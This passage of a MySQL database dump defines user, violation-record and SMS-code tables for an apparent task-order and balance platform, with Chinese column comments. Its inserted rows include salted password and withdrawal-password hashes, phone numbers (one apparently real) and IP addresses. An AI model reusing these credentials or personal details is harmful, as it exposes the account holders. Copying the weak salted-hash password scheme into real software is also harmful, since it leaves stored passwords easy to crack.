/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xy_task_robot`
--

LOCK TABLES `xy_task_robot` WRITE;
/*!40000 ALTER TABLE `xy_task_robot` DISABLE KEYS */;
/*!40000 ALTER TABLE `xy_task_robot` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xy_user_error`
--

DROP TABLE IF EXISTS `xy_user_error`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xy_user_error` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL COMMENT '用户ID',
  `addtime` int(11) NOT NULL COMMENT '记录时间',
  `oid` char(18) DEFAULT '' COMMENT '交易单号',
  `type` int(11) NOT NULL DEFAULT '1' COMMENT '记录类型 1解封 2违规操作 3冻结',
  PRIMARY KEY (`id`),
  KEY `uid` (`uid`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=56 DEFAULT CHARSET=utf8mb4 COMMENT='会员-违规操作记录表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xy_user_error`
--

LOCK TABLES `xy_user_error` WRITE;
/*!40000 ALTER TABLE `xy_user_error` DISABLE KEYS */;
/*!40000 ALTER TABLE `xy_user_error` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xy_users`
--

DROP TABLE IF EXISTS `xy_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xy_users` (
  `id` int(10) unsigned NOT NULL,
  `tel` varchar(255) NOT NULL DEFAULT '' COMMENT '手机',
  `username` varchar(36) NOT NULL DEFAULT '' COMMENT '用户名',
  `nickname` varchar(36) NOT NULL DEFAULT '' COMMENT '昵称',
  `pwd` char(40) NOT NULL DEFAULT '' COMMENT '密码',
  `salt` char(16) NOT NULL DEFAULT '' COMMENT '密码盐',
  `parent_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '上级ID',
  `signiture` varchar(120) NOT NULL DEFAULT '' COMMENT '个性签名',
  `pwd_error_num` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '密码错误次数',
  `allow_login_time` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '允许登录时间',
  `real_name` varchar(36) NOT NULL DEFAULT '' COMMENT '真实姓名',
  `id_card_num` char(18) NOT NULL DEFAULT '' COMMENT '身份证号码',
  `top_pic` varchar(96) NOT NULL DEFAULT '' COMMENT '身份证正面图',
  `bot_pic` varchar(96) NOT NULL DEFAULT '' COMMENT '身份证背面图',
  `id_status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '实名认证状态，0未审核，1审核通过，2审核不通过',
  `invite_code` char(6) NOT NULL DEFAULT '' COMMENT '邀请码',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '注册时间',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '1' COMMENT '状态，1启用，2禁用',
  `real_time` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '实名时间',
  `pwd2` char(40) NOT NULL DEFAULT '' COMMENT '提现密码',
  `salt2` char(16) NOT NULL DEFAULT '' COMMENT '提现密码盐',
  `headpic` varchar(3000) NOT NULL DEFAULT '' COMMENT '头像',
  `balance` decimal(15,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '账户余额',
  `freeze_balance` decimal(15,2) NOT NULL DEFAULT '0.00' COMMENT '账号冻结金额',
  `login_status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '是否登录状态，1：是，0否',
  `recharge_num` decimal(7,2) NOT NULL DEFAULT '0.00' COMMENT '日充值金额',
  `deposit_num` decimal(7,2) NOT NULL DEFAULT '0.00' COMMENT '日提现金额',
  `deal_status` tinyint(1) unsigned NOT NULL DEFAULT '1' COMMENT '交易状态，0交易冻结，1停止交易，2等待交易，3交易中',
  `deal_error` tinyint(1) NOT NULL DEFAULT '0' COMMENT '违规次数',
  `deal_reward_count` int(11) NOT NULL DEFAULT '0' COMMENT '奖励交易次数',
  `deal_count` int(4) NOT NULL DEFAULT '0' COMMENT '当日交易次数',
  `deal_time` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '最后交易日期(年月日)',
  `active` smallint(5) unsigned NOT NULL DEFAULT '0' COMMENT '激活状态，0未激活(首次充值发放推广奖励)，1已激活',
  `childs` int(11) NOT NULL DEFAULT '0' COMMENT '直推用户数量',
  `kouchu_balance` decimal(15,2) DEFAULT NULL COMMENT '扣除金额',
  `kouchu_balance_uid` int(11) DEFAULT NULL,
  `show_td` int(11) DEFAULT '1',
  `show_cz` int(11) DEFAULT '1',
  `show_tx` int(11) DEFAULT '1',
  `show_tel` int(11) DEFAULT '1',
  `show_num` int(11) DEFAULT '1',
  `show_tel2` int(11) DEFAULT '1',
  `wx_ewm` varchar(255) DEFAULT NULL,
  `zfb_ewm` varchar(255) DEFAULT NULL,
  `level` int(11) DEFAULT '-1',
  `lixibao_balance` decimal(15,4) DEFAULT '0.0000' COMMENT '利息宝金额',
  `lixibao_dj_balance` decimal(15,4) DEFAULT '0.0000' COMMENT '利息宝冻结金额',
  `ip` varchar(128) DEFAULT NULL,
  `is_jia` int(11) DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='会员-用户表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xy_users`
--

LOCK TABLES `xy_users` WRITE;
/*!40000 ALTER TABLE `xy_users` DISABLE KEYS */;
INSERT INTO `xy_users` VALUES (20,'13800000000','Jack','','64e9cef09c564659f46faaf22ad2a5de413837d6','8822',0,'',0,0,'','','','',0,'BH97KR',1609499096,1,0,'25ebd0a4cf990564178344b33854de33af8de4be','43059','/static_new6/headimg/2.8184534.png',104970.93,0.00,1,0.00,0.00,1,0,20,8,1609689600,1,10,0.00,0,1,1,1,1,1,1,NULL,NULL,3,222.0000,0.0000,'88.218.192.65',0),(21,'13800000001','111','','6774930111140147c1d59d55dd01feb6a2401436','65438',20,'',0,0,'','','','',0,'MH7V2W',1609412696,1,0,'','','',55.00,0.00,0,0.00,0.00,1,0,0,0,0,0,0,NULL,NULL,1,1,1,1,1,1,NULL,NULL,0,0.0000,0.0000,NULL,0),(22,'13800000002','222','','979183762e7c8ce54f3a038a611b82500cf8b023','44317',20,'',0,0,'','','','',0,'HXVMUG',1584292854,1,0,'','','',0.00,0.00,0,0.00,0.00,1,0,0,0,0,0,0,NULL,NULL,1,1,1,1,1,1,NULL,NULL,NULL,0.0000,0.0000,NULL,0),(23,'13800000003','333','','dafdf9a585f81f134c89e61bbcc86bd0a48b5c9e','30230',20,'',0,0,'','','','',0,'PWBESH',1584292869,1,0,'','','',0.00,0.00,0,0.00,0.00,1,0,0,0,0,0,0,NULL,NULL,1,1,1,1,1,1,NULL,NULL,NULL,0.0000,0.0000,NULL,0),(24,'13800000004','444','','2fee1c110a874777cffff477fbb444cd906e2836','29049',20,'',0,0,'','','','',0,'SJZ854',1584292884,1,0,'','','',0.00,0.00,0,0.00,0.00,1,0,0,0,0,0,0,NULL,NULL,1,1,1,1,1,1,NULL,NULL,NULL,0.0000,0.0000,NULL,0),(25,'13800000005','555','','2444ff3ddb9d73348426328ab40fee3a51f6012a','2154',20,'',0,0,'','','','',0,'ESKHQW',1584292902,1,0,'','','',0.00,0.00,0,0.00,0.00,1,0,0,0,0,0,0,NULL,NULL,1,1,1,1,1,1,NULL,NULL,NULL,0.0000,0.0000,NULL,0),(26,'13800000006','666','','28360a528d9e31770bbee982ef8148d7917bbb96','61630',20,'',0,0,'','','','',0,'RMPGUV',1584292916,1,0,'','','',0.00,0.00,0,0.00,0.00,1,0,0,0,0,0,0,NULL,NULL,1,1,1,1,1,1,NULL,NULL,NULL,0.0000,0.0000,NULL,0),(27,'13800000007','777','','c640ad7cb0509814f3e42db9627f395f5b2bb889','16738',20,'',0,0,'','','','',0,'P6352E',1584292930,1,0,'','','',0.00,0.00,0,0.00,0.00,1,0,0,0,0,0,0,NULL,NULL,1,1,1,1,1,1,NULL,NULL,NULL,0.0000,0.0000,NULL,0),(28,'13800000008','888','','fc416c9313e4544d45e1290dddd354c414fbf90a','4061',20,'',0,0,'','','','',0,'VQNC85',1584293015,1,0,'','','',0.00,0.00,0,0.00,0.00,1,0,0,0,0,0,0,NULL,NULL,1,1,1,1,1,1,NULL,NULL,NULL,0.0000,0.0000,NULL,0),(29,'13800000009','999','','4c2851298e214ceb2027b335b96a6f7c45818da7','982',28,'',0,0,'','','','',0,'4G6ECF',1584293030,1,0,'','','',0.00,0.00,0,0.00,0.00,1,0,0,0,0,0,0,NULL,NULL,1,1,1,1,1,1,NULL,NULL,0,0.0000,0.0000,NULL,0),(30,'13800000011','fang','','8faf9783a6dc50c90661f518de14165e22a9bbc2','35532',0,'',0,0,'','','','',0,'HCKTUA',1585100307,1,0,'c18ba8d8cda8217ad038b0ff7200b780e6f50da6','5631','',0.00,0.00,1,0.00,0.00,1,0,0,0,0,0,0,NULL,NULL,1,1,1,1,1,1,NULL,NULL,0,0.0000,0.0000,NULL,0),(31,'6281210506807','Marry','','a2c542a3d15d6fdff25b12d901b0aff18fa3eb4b','6844',20,'',0,0,'','','','',0,'4TQHX5',1609919229,1,0,'aa106758191c30e6168c2d3769dad75210717d29','96210','',1021.21,0.00,1,0.00,0.00,1,0,0,6,1610380800,0,0,NULL,NULL,1,1,1,1,1,1,NULL,NULL,2,0.0000,0.0000,'127.0.0.1',0);
/*!40000 ALTER TABLE `xy_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xy_verify_msg`
--

DROP TABLE IF EXISTS `xy_verify_msg`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xy_verify_msg` (
  `tel` varchar(225) NOT NULL DEFAULT '' COMMENT '用户ID',
  `msg` char(5) NOT NULL DEFAULT '' COMMENT '验证码',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '发送时间',
  `type` tinyint(4) NOT NULL DEFAULT '0' COMMENT '类型，1注册,2修改密码，3修改二级密码',
  PRIMARY KEY (`tel`),
  KEY `type` (`type`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xy_verify_msg`
--

LOCK TABLES `xy_verify_msg` WRITE;
/*!40000 ALTER TABLE `xy_verify_msg` DISABLE KEYS */;
INSERT INTO `xy_verify_msg` VALUES ('','71635',1609917582,1);
/*!40000 ALTER TABLE `xy_verify_msg` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Dumping events for database 'manage_robot'
--

--
-- Dumping routines for database 'manage_robot'
--
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2022-01-05 15:19:43
